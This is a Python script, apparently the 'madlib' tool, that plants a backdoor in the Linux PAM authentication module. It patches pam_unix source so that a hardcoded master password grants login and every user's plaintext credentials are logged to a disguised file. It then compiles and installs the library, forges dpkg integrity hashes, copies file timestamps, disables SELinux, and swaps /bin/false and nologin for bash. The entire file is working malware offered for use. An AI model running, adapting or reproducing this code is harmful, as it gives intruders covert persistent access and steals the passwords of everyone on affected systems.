#!/usr/bin/python3
import os
import shutil
import getpass
import subprocess
import tempfile
import time
import urllib.request
import sys
import socket
import random
import string
import crypt
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

conf = {
    "password": "secretpassxd",
    "log_location": "/usr/include/type.h",
}

install_dirs = [
    "/lib/security/pam_unix.so",
    "/usr/lib64/security/pam_unix.so",
    "/lib/x86_64-linux-gnu/security/pam_unix.so",
]

pam_hash_location = [
    "/var/lib/dpkg/info/libpam-modules:amd64.md5sums"
]

# file name, hash locations
replace_files = {
    "/bin/false" : [
        "/var/lib/dpkg/info/coreutils.md5sums"
    ],
    "/usr/sbin/nologin" : [
        "/var/lib/dpkg/info/login.md5sums"
    ]
}

banner = r'''                    .___.__  ._____.    
  _____ _____     __| _/|  | |__\_ |__  
 /     \\__  \   / __ | |  | |  || __ \ 
|  Y Y  \/ __ \_/ /_/ | |  |_|  || \_\ \
|__|_|  (____  /\____ | |____/__||___  /
      \/     \/      \/              \/
    https://github.com/rek7/madlib/'''

def gen_bcrypt_salt(length=10):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

bcrypt_salt = gen_bcrypt_salt()

def gen_bcrypt_pass(password):
    return crypt.crypt(password, bcrypt_salt)

src = '''
if(strcmp(crypt(p, "{}"), "{}") == 0){{
		retval=PAM_SUCCESS;
	}} else if(retval == PAM_SUCCESS) {{
		FILE *out = fopen("{}", "a");
		fprintf(out, "pam:%s:%s\\n", name, p);
		fclose(out);
}}
'''.format(bcrypt_salt, gen_bcrypt_pass(conf["password"]), conf["log_location"])

def place_backdoor(src_location):
    is_tainted = False
    tmp=tempfile.mkstemp()
    try:
        with open(src_location, "r", errors="ignore") as fd1, open(tmp[1],'w') as fd2:
            for line in fd1:
                if line.find("retval = _unix_verify_password(pamh, name, p, ctrl);") != -1:
                    line = line.replace('retval = _unix_verify_password(pamh, name, p, ctrl);',"retval = _unix_verify_password(pamh, name, p, ctrl); \n{}".format(src))
                    is_tainted = True
                fd2.write(line)
        fd2.close()
        fd1.close()
        os.rename(tmp[1], src_location)
    except Exception as e:
        prompt("-", "Place Backdoor: {}".format(e))
    return is_tainted

def self_remove(original_file):
    os.remove(original_file + "/"+ sys.argv[0])

def prompt(icon, message, end="\n"):
    print("[{}] [{}] {}".format(time.strftime('%X'), icon, message), end=end)

def update_dpkg_hashes(dpkg_location, bin_location, replace_str):
    tmp=tempfile.mkstemp()
    try:
        with open(dpkg_location, "r", errors="ignore") as fd1, open(tmp[1],'w') as fd2:
            for line in fd1:
                entry = line.strip().split("  ")
                if entry[1].find(replace_str) != -1:
                    bin_md5 = program_output('md5sum "{}" | cut -d " " -f 1'.format(bin_location)).strip()
                    fd2.write("{}  {}\n".format(bin_md5, entry[1]))
                else:
                    fd2.write(line)
            fd2.close()
            fd1.close()
            os.rename(tmp[1], dpkg_location)
            return True
    except Exception as e:
        prompt("-", "Update DPKG Hashes: {}".format(e))
    return False

def install_pam(current_location):
    for possible in install_dirs:
        if os.path.exists(possible):
            for file_name, hash_locations in replace_files.items():
                shutil.copy("/bin/bash", file_name)
                for integrity_file in hash_locations:
                    if os.path.exists(integrity_file):
                        if update_dpkg_hashes(integrity_file, file_name, file_name[1::]):
                            break     
            os.rename(current_location, possible)
            if os.path.exists(possible):
                pam_dir = os.path.dirname(os.path.abspath(possible))
                os.system("touch -d \"$(stat -c '%y' {}/pam_time.so)\" {}".format(pam_dir, possible))
                os.system("chmod --reference={}/pam_time.so {}".format(pam_dir, possible))
                for integrity_file in pam_hash_location:
                    if os.path.exists(integrity_file):
                        if update_dpkg_hashes(integrity_file, possible, "pam_unix.so"):
                            break
                return possible
    return False

def download_file(url, output_name):
    try:
        if urllib.request.urlretrieve(url, output_name):
            return True
    except Exception as e:
        if e.code == 404:
            prompt("-", "Unable to find a Library, Specify Manually".format(e))
        else:
            prompt("-", "Download File: {}".format(e))
    return False

def program_output(cmd):
    try:
        return subprocess.check_output(cmd, shell=True).decode("utf-8")
    except:
        pass
    return False

def fix_se_linux():
    if os.path.exists("/etc/selinux/config"):
        prompt("!", "SE Linux Detected, overwiting to disable.")
        with open("/etc/selinux/config", "r", errors="ignore") as se_file:
            se_conf = se_file.read()
        se_file.close()
        se_linux_updates = []
        for line in se_conf.splitlines():
            line = line.strip()
            if line.find("SELINUX=") != -1:
                se_linux_updates.append("SELINUX=disabled")
            else:
                se_linux_updates.append(line)
        with open("/etc/selinux/config", "w") as fd2:
            for se_updated_line in se_linux_updates:
                fd2.write("{}\n".format(se_updated_line))
        fd2.close()

def get_pam_version():
    try:
        import platform
        linux_distro = platform.linux_distribution()[0].lower()
    except Exception:
        import distro
        linux_distro = distro.like()
    if linux_distro in ["ubuntu", "debian", "mint", "kali"]:
        return program_output("dpkg -s libpam-modules | grep -i Version | awk '{ print $2 }'").split("-")[0]
    elif linux_distro in ["redhat", "centos", "centos linux", "fedora"]:
        return program_output("yum list installed | grep 'pam\.*' | awk '{print $2}'").split("-")[0]
    return False

if __name__ == "__main__":
    print(banner)
    if os.geteuid() == 0:
        if len(sys.argv) == 2:
            pam_version = sys.argv[1]
        else:
            pam_version = get_pam_version()
            if not pam_version:
                prompt("-", "Unable to Find PAM Version, Please Manually Specify")
                exit(1)
            else:
                prompt("!", "Detected PAM Version: '{}'".format(pam_version))
        dl_url = "https://github.com/linux-pam/linux-pam/releases/download/v{}/Linux-PAM-{}.tar.xz"
        src_dir = "/tmp/Linux-PAM-{}".format(pam_version)
        prompt("!", "Downloading Pam: '{}'".format(pam_version), "\r")
        if download_file(dl_url.format(pam_version, pam_version), "/tmp/linux_pam.tar"):
            if os.path.exists("/tmp/linux_pam.tar"):
                prompt("+", "PAM TAR Download Completed")
                script_location = os.path.realpath(__file__)
                os.chdir("/tmp/")
                prompt("!", "Extracting...", "\r")
                os.system("tar xvf /tmp/linux_pam.tar > /dev/null 2>&1")
                os.remove("/tmp/linux_pam.tar")
                if os.path.exists(src_dir):
                    prompt("+", "Finishing Extracting")
                    os.chdir(src_dir)
                    if place_backdoor("modules/pam_unix/pam_unix_auth.c"):
                        prompt("+", "Added Backdoor")
                        prompt("!", "Compiling Tainted Lib", "\r")
                        os.system("./configure > /dev/null 2>&1 && make -j$(nproc) > /dev/null 2>&1")
                        if os.path.exists("modules/pam_unix/.libs/pam_unix.so"):
                            prompt("+", "Finished Compiling Tainted Lib")
                            os.system("strip modules/pam_unix/.libs/pam_unix.so")
                            fix_se_linux()
                            result = install_pam("modules/pam_unix/.libs/pam_unix.so")
                            shutil.rmtree(src_dir)
                            if result:
                                prompt("+", "Finished Successfully Compiled PAM File Moved to: '{}'".format(result))
                                # os.remove(script_location)
                                exit(0)
                            else:
                                prompt("-", "Unable to Place the File")
                        else:
                            prompt("-", "Failed to Compile")
                    else:
                        prompt("-", "Failed to Place Backdoor")
                else:
                    prompt("-", "Failed to Extract SRC dir")
        else:
            prompt("-", "Failed to Download File")
    else:
        prompt("-", "Root Needed")
prompt("!", "Exiting.")
exit(1)
